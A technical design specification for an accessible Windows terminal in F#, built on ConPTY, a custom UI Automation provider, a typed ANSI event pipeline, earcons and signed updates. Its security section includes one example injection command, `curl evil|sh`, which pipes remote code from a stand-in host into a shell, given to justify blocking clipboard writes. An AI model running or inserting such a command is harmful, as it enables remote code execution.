# Engineering a screen-reader-native Windows terminal in F#

A Windows-only accessible terminal host built in F#/.NET is not only feasible but has a **clear, mostly de-risked implementation path**: ConPTY + WPF + a custom UI Automation provider + TPL Dataflow event bus + NAudio for earcons + Velopack/SignPath for signed auto-update. The core insight across every research area is that **existing terminals fail blind users because they scrape pixels, not semantics** — NVDA diffs cell grids with ~30ms lag, redrawn spinners trigger infinite speech loops, and Ink/React-based TUIs like Claude Code actively break raw-mode input assumptions. The fix is architectural: parse ANSI into a typed event stream, derive higher-level semantics (prompts, selection lists, errors), and expose those semantics through UIA’s `ITextRangeProvider` and `UiaRaiseNotificationEvent` rather than re-rendering a visual buffer and hoping the screen reader keeps up. This specification captures the tradeoffs, exact APIs, and reference implementations needed to build the product, and flags the three non-obvious risks: ConPTY’s translation layer quirks, WPF’s UIA thread affinity, and Claude Code’s closed-source Ink fork whose spinner re-render cadence is the single biggest accessibility hazard.

## The problem space and what prior art teaches

Claude Code, Windows Terminal, VS Code’s integrated terminal, PowerShell, and conhost all render ANSI visually but **expose essentially nothing useful to UI Automation** beyond a cell grid. VS Code’s “Terminal Accessible View” (Alt+F2 since 1.83) is a read-only editor mirror   requiring shell integration (OSC 633, a VS Code fork of OSC 133) — useful as a *fallback* pattern but unable to handle live interaction. Windows Terminal does implement a UIA provider (Carlos Zamora’s work in `TermControlUiaProvider` + `UiaTextRangeBase` + `UiaRenderer`), but its quality is uneven and **NVDA still prefers its own diff-based LiveText path** (`_DiffBasedWinTerminalUIA` vs `_NotificationsBasedWinTerminalUIA` overlay classes in NVDA’s `winConsoleUIA.py`).  The canonical lesson from T.V. Raman’s Emacspeak (1994–present)  is reinforced: **speak the underlying information, not the visual representation**.  Raman’s auditory-CSS personalities  and cascading voice-lock  are directly applicable — ANSI bold should cascade a “voice-bolden” pitch/volume delta, not be announced as “bold” in running speech.

The closest PTY-level prior art is **TDSR** (Tyler Spivey) — Python, spawns shell under a pty, feeds bytes into `pyte`, diffs, speaks. Its plugin API (`parse_output(lines) -> List[str]`)  maps cleanly onto the F# `SemanticInterpreter` interface proposed below. TDSR’s weaknesses — no Windows UIA, no earcons for colors, no structured semantics beyond regex plugins — are precisely the gaps this project fills. Linux TTY screen readers (Speakup in-kernel,  Fenrir userland, BRLTTY) **do not work for Claude Code**: the official Claude Code issue #13074 documents that Ink’s `setRawMode` bypasses the kernel tty-echo path  NVDA/Speakup depend on,  and issue #11002 reports NVDA freezes during token streaming and spinner updates, forcing multiple screen-reader restarts per session.   Issue #15509 is the cleanest statement of the visible symptom: “ANSI formatting characters cause fluttering sounds when my screen reader reads the screen.”  

Two third-party workarounds are **design-language precedents**: `claude-sonar` (github.com/vylasaven/claude-sonar) classifies tool events as noise/routine/notable/important  with earcons  for the top two tiers;  `claude-a11y` (github.com/JacquelineDMcGraw/claude-a11y) spawns Claude Code with `TERM=dumb NO_COLOR=1`  and re-parses markdown via a `remark` AST.  Google’s Gemini CLI ships `--screen-reader`  (issue #5148) with open regressions around persistence (#4155), selection-list deadlocks (#20285), and Windows permission errors (#14807). GitHub Copilot CLI (GA February 2026) suppresses placeholder re-announce on submission.  **None of these attacks the root cause** — the terminal surface itself is not semantically addressable.

## ConPTY is the only viable host mechanism

Direct stdin/stdout/stderr pipe redirection **fails deterministically** for interactive TUIs: child processes call `isatty()` or `GetFileType()`, detect a non-TTY, and disable line editing, prompts, and color; Node.js and Python line-buffer stdout; there is no SIGWINCH equivalent; Claude Code’s Ink TUI  collapses entirely. The Windows Pseudo-Console API (Windows 10 1809+)  solves this by hosting an in-memory `conhost` that maintains a character grid for legacy Win32 console apps and emits a **normalized UTF-8 VT stream** on the outside. The canonical setup flow is: `CreatePipe` twice → `CreatePseudoConsole({cols,rows}, inputReadSide, outputWriteSide, 0, &hPC)`  → immediately close the two ends now owned by conpty → build a `STARTUPINFOEXW` (note the `W` — `cb` must equal `sizeof(STARTUPINFOEXW)`, a common bug) → `InitializeProcThreadAttributeList` → `UpdateProcThreadAttribute(…, PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE (0x00020016), hPC, IntPtr.Size, …)` → `CreateProcess` with `bInheritHandles=FALSE` and `EXTENDED_STARTUPINFO_PRESENT`. Microsoft’s `MiniTerm` sample (`github.com/microsoft/terminal/tree/main/samples/ConPTY/MiniTerm`) is the closest C# reference and ports to F# directly.

ConPTY has **quirks that bite in production**. It does not passthrough DCS sequences by default (issue #17313), so Sixel and kitty graphics never reach your parser.  Its mouse handling is weak, and third parties (WezTerm, Yazi) document ConPTY as a bottleneck.  Wide-character width handling uses conhost’s evolving wcwidth tables — grapheme clusters and combining marks may be approximated. There is **lag between input and output** from conpty’s double-buffered render cadence. Servicing input, output, and process-exit on one thread can deadlock — Microsoft’s docs explicitly warn this. The practical countermeasures: use `System.IO.Pipelines` on the output side with synchronous `FileStream` (ConPTY forbids `OVERLAPPED`),   dedicate a thread per channel,  and parse DECCKM state from the output stream so your input translator emits `ESC O A` vs `ESC [ A` correctly for arrow keys under application-cursor mode. Key translation for arrows, function keys, Home/End/PgUp/PgDn, and Ctrl/Alt modifier combinations follows xterm’s `ctlseqs` table; the Windows Terminal implementation in `src/terminal/input/terminalInput.cpp` is the authoritative reference.

For child lifecycle, **wrap the pseudo-console child in a Windows Job Object with `JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`**. Create the job at startup, set the limit, `CreateProcess` with `CREATE_SUSPENDED`, `AssignProcessToJobObject`, then `ResumeThread`. When your host crashes, the kernel closes the last job handle and terminates all descendants   — essential because Claude Code spawns node.exe which spawns subprocesses. For Claude Code specifically, **bypass shells entirely**: resolve `claude.cmd` via PATH inspection, then `CreateProcess("node.exe", "<path>/claude-cli.js", …)` directly. This avoids cmd.exe’s UTF-8 mangling and PowerShell prompt noise, and guarantees clean exit-code propagation.

## The UIA provider is where accessibility succeeds or fails

The architectural decision is **raw UIA provider (`IRawElementProviderSimple` + `IRawElementProviderFragment` + `ITextProvider2`) over WPF’s built-in AutomationPeer abstraction**. Windows Terminal uses the raw path in C++/WinRT; a WPF FrameworkElementAutomationPeer subclass works for the outer host but the text surface itself should expose UIA directly via `HostProviderFromHandle` on a dedicated HWND. Three load-bearing strings must match Windows Terminal exactly: `AutomationId="Text Area"` triggers NVDA’s console-specific overlay logic,  `ClassName="TermControl"` unlocks JAWS heuristics,  and the root element should expose `AutomationLiveSetting=Polite` so live-region fallback works on older screen readers.

The text exposure is a careful implementation of `ITextRangeProvider` over a scrollable ring-buffer. Endpoints use **start-inclusive, end-exclusive** convention (Windows Terminal changed to this in PR #4018 after NVDA added `ConsoleUIATextInfoWorkaroundEndInclusive` to compensate for the old behavior).  `GetAttributeValue` must return the text attribute identifiers NVDA actually consumes: `UIA_ForegroundColorAttributeId (40008)` and `UIA_BackgroundColorAttributeId (40001)` as 32-bit COLORREF,  `UIA_FontWeightAttributeId (400007)`, `UIA_IsItalicAttributeId (40014)`,   `UIA_UnderlineStyleAttributeId (40030)`,  and `UIA_LinkAttributeId` for OSC 8 hyperlinks. **Microsoft Terminal issue #2161 documents that conhost exposes none of these** — implementing them properly is this product’s single biggest differentiator: NVDA’s “report font attributes” (NVDA+F) will then announce ANSI bold/italic/color at the caret,  which no existing Windows terminal supports.

Streaming output requires **dual-strategy notification**. Raise `UiaRaiseNotificationEvent(NotificationKind.ActionCompleted, NotificationProcessing.All, displayString, activityId)`  for each debounced 150–250ms chunk, coalesced on line boundaries, with control chars stripped before passing as `displayString` (otherwise NVDA verbalizes “escape bracket one A”). Simultaneously keep `TextPattern.TextChangedEvent` firing for NVDA’s LiveText diff path — different NVDA versions prefer different strategies and the `_NotificationsBasedWinTerminalUIA` migration is incomplete. Use `NotificationProcessing.MostRecent` for spinners and progress so the queue does not back up; use `CurrentThenMostRecent` for summary lines like “Process exited with code 1”. Filter out echoed keystrokes using Windows Terminal’s technique (record the last N keys, strip matching prefix from the next output chunk). Windows Terminal’s peer comment is a warning worth heeding: “*Do not RunAsync(…).get(). For whatever reason, this causes NVDA to just not receive SignalTextChanged()’s events.*”  All UIA events must be raised on the WPF Dispatcher thread — marshal from the TPL Dataflow consumer via `Async.SwitchToContext`.

For interactive elements — the **critical Claude Code case** — detect selection lists heuristically (stable rectangular region, exactly one row differs in SGR by fg/bg swap, throughput=0 for >100ms, arrow keys shift highlight by one row) and publish a parallel UIA subtree as a proper `ControlType.List` with `ISelectionProvider` container and `ISelectionItemProvider` + `IInvokeProvider` children. When the user presses Down, translate to the arrow-key bytes on the PTY; when conpty echoes the redraw, update `IsSelected` on the child provider and raise `SelectionItem_ElementSelectedEvent`. NVDA announces the new item as a listbox selection change rather than re-reading the entire redrawn list — this single mechanism solves issue #20285’s class of deadlocks.

## F#-native architecture: typed events fan out from the parser

The recommended F# architecture is a five-stage pipeline: `ConPtyHost → PipeReader → VtParser → SemanticMapper → EventBus → {UiRenderer, UiaProvider, EarconPlayer, Logger, TtsEngine}`. Bytes stream out of the ConPTY pipe through `System.IO.Pipelines`  (zero-copy `ReadOnlySequence<byte>`).  A stateful parser implementing Paul Williams’ VT500 state machine  (**GROUND, ESCAPE, ESCAPE_INTERMEDIATE, CSI_ENTRY, CSI_PARAM, CSI_INTERMEDIATE, CSI_IGNORE, DCS_*, OSC_STRING, SOS_PM_APC_STRING**,  plus an out-of-band UTF-8 sub-state) emits a `VtEvent` discriminated union: `Print | Control | EscDispatch | CsiDispatch | OscDispatch | DcsHook/Put/Unhook | Paste | FocusIn/Out | MouseEvent`. Alacritty’s `vte` crate is the cleanest reference implementation — port it idiomatically to F# with immutable state transitions.  A separate `SemanticMapper` consumes VtEvents + screen state and produces `SemanticEvent` variants: `OutputAppended | PromptDetected | CommandSubmitted | SelectionListShown | SelectionChanged | SpinnerUpdate | ErrorLine | WarningLine | BellRang | HyperlinkOpened | AltScreenEntered`.

The fan-out uses **TPL Dataflow `BroadcastBlock<SemanticEvent>` linked to one bounded `ActionBlock<SemanticEvent>` per consumer** with `MaxDegreeOfParallelism=1`  for per-consumer FIFO. Use `BoundedCapacity=256` on earcon and TTS consumers  so a slow sink never backpressures the parser. `BroadcastBlock` can drop for slow targets — for UIA and logging where drops are unacceptable, substitute `System.Threading.Channels.Channel<T>.CreateUnbounded` per consumer. F# discriminated unions give exhaustive pattern-match safety when new event variants are added; keep `Unknown of byte[]` as the **only** catch-all in the parser so ignored sequences are explicit and auditable.

P/Invoke wraps in a private `Terminal.Native` module: `SafeHandle` subclasses (`SafePseudoConsoleHandle : SafeHandleZeroOrMinusOneIsInvalid`) for HPCON and SafeFileHandle for pipe endpoints; `CharSet=CharSet.Unicode` explicit on every string-bearing API; `Result<_, PtyCreateError>`-returning facade functions. The external API never throws from interop.

### Why WPF + Elmish.WPF wins the GUI-framework comparison

**WPF with Elmish.WPF on .NET 9** is the clear choice. The reasoning: UIA is the central concern; WPF has the most mature `ITextProvider`/`ITextRangeProvider`/`IInvokeProvider`/`IValueProvider` story of any .NET framework, reliable `RaiseNotificationEvent` plumbing via `AutomationPeer`, and copious community examples of custom text-rendering controls with AutomationPeer peers. Windows-only is not a downside — we’ve already accepted that constraint and get no benefit from cross-platform frameworks. **WinUI 3 is disqualified**: Microsoft’s tracking issue `microsoft-ui-xaml#740` confirms F# support remains absent,  and UWP explicitly dropped F#.  Avalonia’s UIA story is an MVP (PR #5177)  with **incomplete TextPattern support on Windows** — a fatal gap for a product whose central control is a rich text surface. Terminal.Gui is a TUI framework inheriting the very accessibility failures we’re solving. Elmish.WPF (github.com/elmish/Elmish.WPF) gives idiomatic F# MVU  with no ViewModel boilerplate;  XAML becomes a thin binding layer. Testing uses **Expecto + FsCheck** for the parser (property-based, "streaming in chunks equals single feed", "never throws on arbitrary bytes") and **FlaUI** for UIA integration (registers notification events, asserts ControlType, drives keyboard input). NVDA-specific automation is **explicitly avoided** — test at the UIA producer level so the product remains screen-reader-agnostic; reserve NVDA/Narrator for manual release acceptance.

## The audio layer is a generalized sink abstraction from day one

Lock in a single abstraction: `IAudioSink.Send(AudioEvent)` where `AudioEvent` is a DU `Earcon | EarconAt of Earcon*Position3D | SpeakText of string*voice*interrupt | RawPcm | OscRaw | Stop`. v1 implements this over **NAudio `WasapiOut` in shared mode at 48kHz**  — shared mode is mandatory because NVDA itself moved to WASAPI  shared in 2023.3+ and will not coexist with exclusive mode on the same endpoint. Earcons are **synthesized at runtime** from parametric `EarconDef` records (frequency, ADSR envelope, amplitude) rather than bundled as WAVs — tiny memory, perfectly consistent across volumes, and allows programmatic color→pitch mapping. Default palette: pentatonic C4–C6, 80ms duration, 5ms attack, 30ms release, amplitude 0.15–0.25 linear (-16 to -12 dBFS).

To avoid NVDA conflict: keep earcons **under 200ms**, confine frequencies to either **<180 Hz** (sub-speech felt register) or **>1.5 kHz** (above speech formants) — never 200–1500 Hz where speech intelligibility lives. Register the audio session as `AUDIO_STREAM_CATEGORY AudioCategory_SoundEffects` so Windows ducks *other* audio during our earcons, not us. Expose a separate-output-device setting (enumerate via `MMDeviceEnumerator.EnumerateAudioEndPoints`) because blind developers commonly route NVDA to earbuds and content to speakers. Detect NVDA’s own ducking mode heuristically  by reading `%APPDATA%\nvda\nvda.ini` `[audio] audioDuckingMode` — no public API exists (NVDA issues #3830, #10441).

Color→earcon mapping uses semantic conventions already present in earcon literature:  **red = short descending chirp 880→440 Hz square wave** (alarm motive), **green = major-third up 659+784 Hz sine** (confirm motive), **yellow = double-tap 660 Hz triangle** (warn motive),   **blue/magenta/cyan = single tones with distinct timbres**, **white = neutral 20ms tick**, **bright variants = +octave with brighter waveform**. 256-color quantizes to nearest ANSI 16 via CIEDE2000 distance in LAB space; truecolor converts to HSL and buckets into 12 named hues, announced only on explicit request (Ctrl+Shift+C “describe color at cursor”). For ANSI styles, follow Emacspeak’s Aural CSS:  **bold = cascading +20% pitch, +3 dB volume** via UIA FontWeight attribute (NVDA announces “bold” when “report font attributes” is enabled);  **italic = +30% pitch-range inflection**; **underline = 150 Hz sub-tone**. Configuration in TOML via `Tomlyn`:

```toml
[color.red]
earcon = "error_chirp"
pitch_hz = [880, 440]
duration_ms = 80
waveform = "square"

[verbosity]
mode = "smart"  # off | smart | verbose
suppress_if_nvda_speaking = true
```

The abstraction scales to the **future roadmap** without refactor: `EarconAt of Earcon*Position3D` already carries spatial coordinates; a future `SpatialSink` wraps `ISpatialAudioClient` (Windows 10 1703+, up to 8.1.4.4 static bed + dynamic objects, HRTF rendering)  with graceful degradation when `GetMaxDynamicObjectCount()==0`.  A future `AsioSink` wraps NAudio’s `AsioOut` for multi-channel (Dante Virtual Soundcard presents as ASIO, aggregates to 64; MADI cards 64/128; composites scale to 256). For the 256-speaker ambition, **do not render 256 channels from .NET** — emit OSC to a local `scsynth` via `Rug.Osc` (`/s_new "earcon3d", id, 0, 0, "freq", f, "x", x, "y", y, "z", z`). SuperCollider’s SynthDefs  handle VBAP/Ambisonics to arbitrary speaker layouts. `CompositeSink` fans each `AudioEvent` to both WasapiSink (always audible locally) and OscSink (optional SC rig) without caller changes.

For self-voicing v2, **Piper TTS** (OHF-Voice/piper1-gpl, successor to rhasspy/piper) is the clear choice: local ONNX VITS, 150–300ms first-byte latency on CPU, excellent neural quality, streams via stdin pipe, interruptible via `ClearBuffer`. Spawn separate Piper processes per semantic channel (stderr in one voice, stdout in another, Claude’s text distinct) — voices are just different `.onnx` files from huggingface.co/rhasspy/piper-voices. Note the license transition: upstream rhasspy/piper archived October 2025, the GPL-3 `piper1-gpl` fork is active; invoke as subprocess to keep our terminal’s license unencumbered (subprocess invocation is not derivative work under most interpretations). SAPI5 (`System.Speech`) and Windows.Media.SpeechSynthesis remain as fallbacks.

## Sequence parsing, keyboard design, and semantic inference

Essential ANSI coverage (>99% of real traffic): all SGR color forms including `ESC[38;2;R;G;Bm` truecolor;   cursor moves CUU/CUD/CUF/CUB/CUP/ED/EL/save/restore; C0 BS/HT/LF/CR/BEL; DEC private modes `?25` (cursor visible), `?1049` (alt screen used by Claude Code and vim), `?2004` (bracketed paste), `?1004` (focus events), `?1000`+`?1002`+`?1006` (SGR mouse); OSC 0/2 title, **OSC 8 hyperlinks** (`ESC]8;;URI\x07text\x1b]8;;\x07`), **OSC 133 shell integration** (`;A` prompt-start, `;B` input-start, `;C` output-start, `;D;exitcode` done); CPR response handling. Deferrable: DCS sigils, SOS/PM/APC, DEC line drawing, palette OSC 4/104, proprietary OSC 777/1337.

Claude Code emits specifically: `?25l` cursor hide on Ink mount; `?1004h` focus reporting (causing iTerm2 activity-dot bug #30199 when user tab-switches); `?1003h` any-motion mouse; `?2004h` bracketed paste; `?1049h`/`?1049l` for `/doctor`, transcript, and modal dialogs; SGR truecolor via chalk; OSC 0 window title; cursor-up + `\x1B[2K` EL + redraw every ~100ms for the thinking spinner. It does **not** emit OSC 8 (#13008 open) or OSC 133 (#22528, #26235, #32635 all open and unresolved). The **spinner re-render loop is the single largest accessibility failure**: every Ink frame diff rewrites the “Thinking…” line, NVDA/JAWS re-announce the changed line continuously, screen readers freeze. Mitigation: detect stable single-line cursor-up/EL/rewrite patterns with throughput=0 and classify as `SpinnerUpdate` — suppress announcement entirely, optionally play a periodic earcon heartbeat instead.

Keyboard design honors three layers. **Passthrough to PTY**: Ctrl+A/B/C/D/E/F/K/L/N/P/R/T/U/W/Y/Z, arrow keys, Home/End, PgUp/PgDn, Tab, Shift+Tab, F1–F12 bare, Esc, Alt+letter meta, Ctrl+Space, Ctrl+. **Never steal**: anything with Insert, CapsLock, or `NVDA+` prefix; these belong to the screen reader. **App-owned bindings**, modeled on VS Code and NVDA browse-mode quick-nav: **Alt+F1** accessibility help overlay, **Alt+F2** toggle review mode, **Ctrl+Shift+P** command palette, **Ctrl+Shift+E/W** next error/warning, **Ctrl+Shift+O** jump-to-prompt, **Ctrl+Shift+M** mute earcons, **Alt+1..4** set verbosity, **F6** cycle focus regions. Review mode (analogous to NVDA browse mode) adopts quick-nav letters: `e/E` error, `w/W` warning, `p/P` prompt, `c/C` command, `o/O` output block, `l/L` link, `d/D` diff marker, `h/H` heading, `i/I` interactive element, `g/G` top/bottom, `j/k` line. Interactive mode sends keystrokes to PTY; Esc returns to interactive from review.

The semantic interpretation layer is pluggable `ISemanticInterpreter` subscribers on the raw event stream, each emitting additional `SemanticEvent`s. Ship opt-in interpreters for **OSC 133 shell integration** (authoritative), fallback prompt regex, gcc/clang/rustc/MSBuild/fsc compiler diagnostics (`file:line:col: severity: message`), Python and .NET stack traces, pytest/xunit test results, git diff hunks, URL and filesystem path detection (exposed via UIA Hyperlink pattern for braille routing), and JSON/YAML pretty-print. For Claude Code specifically, **inject heuristic OSC 133 A/B/C/D** by detecting its Ink box-drawing signature (`╭─╮│╰─╯` + `│ >` prompt + “esc to interrupt” footer) because the upstream project refuses to emit shell integration.

## Security, distribution, and the trust model

ANSI escape injection is a real threat surface — not theoretical. CVE-2003-0063 (xterm title-report echo-to-shell), CVE-2022-45872 (iTerm2 DECRQSS response injection, CVSS 9.8), CVE-2022-44702 (Windows Terminal OSC 9;9 CWD), CVE-2024-50349/52005 (git ANSI in log messages), and the dgl.cx 2023 survey “finding 10 CVEs” all exploit terminals that respond to attacker-influenced queries or interpret child-written sequences as UI effects. **Mitigations are mandatory**: disable all response-generating sequences by default (DSR, DA1/DA2/DA3, DECRQM, DECRQSS, cursor position report, title report CSI 21 t, font-size reports); ignore OSC 52 clipboard writes (child-injected `curl evil|sh` with base64 embedded `\n` becomes RCE on paste); sanitize OSC 0/2 window title to strip control chars and truncate; allowlist OSC 8 hyperlink schemes (http/https/file); strip control chars from `displayString` passed to `UiaRaiseNotificationEvent`; rate-limit output ingestion at ~10MB/sec to defeat ANSI-bomb DoS. PTY isolation is provided by the kernel — keep `bInheritHandles=FALSE`, pipes anonymous with default DACL, never run elevated with an unelevated child.

Distribution uses **Velopack + GitHub Releases + SignPath Foundation**. Velopack (velopack.io, MIT, Rust-backed) is the 2026 successor to Squirrel.Windows: handles the “can’t overwrite running EXE” problem via versioned install dirs under `%LocalAppData%\{packId}\current\` with an external `Update.exe` shim, supports delta packages, integrates GitHub releases as source, applies updates in ~2 seconds without UAC. The F# client code is seven lines; disable `SetAutoApplyOnStartup` and trigger from Ctrl+Shift+U so updates are user-initiated and announced via UIA LiveRegion as progress accrues. **SignPath Foundation OSS** (signpath.org) is free for OSI-licensed projects with active maintenance and per-release manual approval; it is the gold standard for OSS Authenticode and builds SmartScreen reputation through the Foundation CA. Azure Artifact Signing (formerly Trusted Signing, $9.99/month Basic) is the paid alternative with short-lived (~72h) certs and FIPS 140-2 Level 3 HSMs — now open to individual US/Canada developers via Entra Verified ID. **Note**: EV certificates no longer grant instant SmartScreen reputation as of March 2024; reputation now accrues organically regardless of validation tier. Layer an additional Ed25519 public key pin inside the app to verify release manifests — defense in depth against a compromised GitHub release — and document the trust model explicitly in `docs/SECURITY.md` (what’s covered: corp MITM, repo compromise; what’s not: stolen signing key + dev machine).

## Recommended F# module layout and build posture

```
src/
  Terminal.Domain/          ─ DUs, records, pure (VtEvent, SemanticEvent, PtyEvent, UiState)
  Terminal.Native/          ─ P/Invoke + SafeHandles, Result<_,_> facade
  Terminal.ConPtyHost/      ─ CreatePseudoConsole + CreateProcess + Job Object + pipe mgmt
  Terminal.VtParser/        ─ ReadOnlySequence<byte> → VtEvent[], Williams state machine
  Terminal.Semantics/       ─ Screen model, VtEvent → SemanticEvent, interpreters
  Terminal.EventBus/        ─ BroadcastBlock fan-out + per-consumer Channels
  Terminal.Ui.Wpf/          ─ Elmish.WPF host + TerminalSurface custom FrameworkElement
  Terminal.Uia/             ─ TerminalAutomationPeer + ITextProvider2 + ITextRangeProvider
  Terminal.Earcons/         ─ NAudio WasapiOut + synthesized tone renderer
  Terminal.Audio/           ─ IAudioSink abstraction + CompositeSink
  Terminal.Tts/             ─ (future) Piper/SAPI5/WinRT SpeechSynthesis sinks
  Terminal.Osc/             ─ (future) Rug.Osc SuperCollider sink
  Terminal.Update/          ─ Velopack wrapper + Ed25519 manifest verification
  Terminal.App/             ─ composition root, keyboard router, config
tests/
  Terminal.VtParser.Tests/  ─ Expecto + FsCheck property tests, golden files
  Terminal.Semantics.Tests/ ─ Ink/Claude Code replay fixtures
  Terminal.Uia.Tests/       ─ FlaUI integration
```

CI runs on GitHub Actions `windows-latest` runners (interactive desktop present, UIA tests work). Signing integrates in a release-only job via SignPath’s GitHub Actions plugin with manual approval. NVDA is **not** installed in CI — assert at the UIA producer level so tests are screen-reader-agnostic; NVDA and Narrator acceptance is manual against each release.

## Risks, open questions, and what to prove first

Three non-obvious risks deserve explicit mitigation plans. **First**, ConPTY’s translation-layer quirks (no DCS passthrough, weak mouse, evolving wcwidth) mean users hitting Sixel, kitty graphics, or newer emoji may see imperfect output — document this and consider shipping a pinned `conpty.dll` from OpenConsole as WezTerm does (MIT-licensed, adds update burden). **Second**, WPF UIA thread affinity: all automation events must be raised on the Dispatcher thread, and `BroadcastBlock` does not put you there — marshal via `Dispatcher.InvokeAsync` or `Async.SwitchToContext`, and heed Windows Terminal’s “do not `RunAsync(...).get()`” warning. **Third**, Claude Code is closed-source; exact byte sequences are inferred from DeepWiki reverse-engineering, community forks (youmengde/claude-code-snapshot-backup, instructkr wiki), and CHANGELOG entries — **capture ground-truth traces early** via `script -c 'claude' session.log` on macOS or equivalent stdout tee on Windows. Ink’s `INK_SCREEN_READER` env var is documented as “basic ARIA support” but does not appear honored in Claude Code’s custom Ink fork.

Unresolved upstream issues we cannot fix but must compensate for: Claude Code issues #11002, #13074, #15509 (spinner/raw-mode/ANSI accessibility), #22528/#26235/#32635 (OSC 133 not emitted), #13008 (OSC 8 not emitted), #769/#18708/#9562 (flickering/stuck spinner). **The first engineering spike should be proving end-to-end viability**: ConPTY + minimal VT parser + WPF AutomationPeer with `UiaRaiseNotificationEvent` against NVDA reading “echo hello” in cmd.exe. If that works cleanly with no announcement flooding, proceed to Claude Code. If NVDA freezes or double-announces, the `_NotificationsBasedWinTerminalUIA` path requires deeper investigation before architecture commitment.

## Conclusion

The path to a screen-reader-native Windows terminal is an unusual combination: **Microsoft’s own ConPTY host is sound**, **WPF’s UIA surface is mature**, and **the F# type system handles the state-machine-heavy parser beautifully** — but no one has combined them specifically for modern Ink/React TUIs with blind users as the primary audience. Every prior accessible-terminal attempt either screen-scraped cell grids (Speakup, Fenrir, NVDA’s current behavior) or PTY-wrapped with a custom voice (TDSR, claude-sonar, claude-a11y), and each collided with the same root cause: spinners re-render, selection lists re-highlight, and screen readers interpret those as document-level churn. The product’s **novel architectural claim** is that a typed semantic event stream — derived from an ANSI parser, cached in a UIA-addressable text model, classified by pluggable interpreters, and announced via UIA notifications with earcons on a separate WASAPI session — is the correct level of abstraction for bridging 1970s-era terminal protocols to 2026-era assistive technology. Everything else (Velopack signing, Piper TTS, OSC to SuperCollider, 256-channel ASIO) is a straightforward extension of the same `IAudioSink` and `SemanticEvent` abstractions, provided they are locked in on day one. The single most important decision not to defer is the UIA provider’s text-attribute exposure: implementing `UIA_ForegroundColorAttributeId`, `UIA_FontWeightAttributeId`, and friends is what makes this terminal categorically different from every existing Windows terminal, and is also what makes braille displays, future screen readers, and Narrator “just work” without further engineering.
